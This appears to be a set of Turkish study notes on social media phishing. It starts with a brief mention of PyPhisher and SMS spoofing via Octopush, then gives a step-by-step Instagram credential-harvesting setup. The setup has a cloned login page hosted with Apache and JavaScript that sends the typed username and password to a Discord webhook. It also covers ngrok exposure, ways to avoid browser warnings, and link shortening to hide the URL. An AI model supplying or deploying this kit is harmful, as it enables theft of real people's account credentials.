# Sosyal Medya Güvenliği

PyPhisher Nedir?

PyPhisher, Python tabanlı bir phishing (oltalama) simülasyon aracıdır. Gerçek web sitelerine benzeyen sahte giriş sayfaları oluşturarak sosyal mühendislik saldırılarının nasıl çalıştığını göstermeye yarar.

Nasıl Kullanılır?

İzinli bir siber güvenlik laboratuvarında temel çalışma mantığı şöyledir:

1. PyPhisher başlatılır.
2. Test edilecek giriş sayfası şablonu seçilir.
3. Laboratuvar ortamında sahte giriş sayfası oluşturulur.
4. Test kullanıcısı sayfayı ziyaret eder.
5. Gerçek parola kullanılmadan, sahte test verileriyle form davranışı incelenir.
6. Phishing saldırılarının nasıl tespit edilebileceği değerlendirilir.

# Sahte Sms Atmak

## octopush

Octopush, toplu SMS, e-posta ve otomatik bildirim göndermek için kullanılan bir iletişim platformudur.

Siber güvenlik açısından:

- SMS Phishing (Smishing): Sahte SMS yoluyla kullanıcıları kandırmaya yönelik saldırı türüdür.
- Sosyal mühendislik testleri: İzinli SMS farkındalık kampanyalarında kullanılabilir.
- SMS API: Yazılımlar üzerinden otomatik SMS gönderilmesini sağlar.

* Sanal numara satın alınıp üye olunabilir

* receivesms ile sms testi yapılabilir

---

# Instagram Oltalama Saldırıları

- Instagram Şifre sıfırlama veya instagram giriş sayfasının orjinal hali kodları kopyalanır. Html css kodları ile hazırlanır.
- İster web hosting al ister kali servis olarak aç. Oluşturulan kopya kalide /var/www/html aktarılır.
  > service apache2 start

//

<script>
function sendMessage() {
var request = new XMLHttpRequest();
request.open("POST", "WEBHOOK"); //dicord kanal açıp webhook linki buraya yapıştırılır
request.setRequestHeader('Content-type', 'application/json');
var params = {
content: ("> **USERNAME : **" + document.getElementById('username').value + "\n> **PASSWORD : **" + document.getElementById('password').value)
}
request.send(JSON.stringify(params));

            setTimeout(function () {
                window.location.replace("https://www.instagram.com");
            }, 1000);
        }
    </script>

//

## Ngrok ile dış dünyaya açmak

- Kali terminalde ilgili konuma yerleşilir /var/www/html/instawebhook
- Üye olduktan sonra ngrok kurulumu için verilen komutlar cp terminalde kullanılır
  /var/www/html/instawebhook > ngrok config add-authtoken ...
  /var/www/html/instawebhook > ngrok http http://localhost:80
- Açılan ekranda https://...free.app kısmı sitenin nete açılmış linkidir
- Tarayıcıda siteye gidildiğinde uyarılar çıkmaması için ngrok ücretli plan alınabilir

* tinyurl.com ile üstteki uzun urlyi kısaltabiliriz

- Kurban giriş bilgileri giriş yaptığında discord kanalında sohbette çıkar
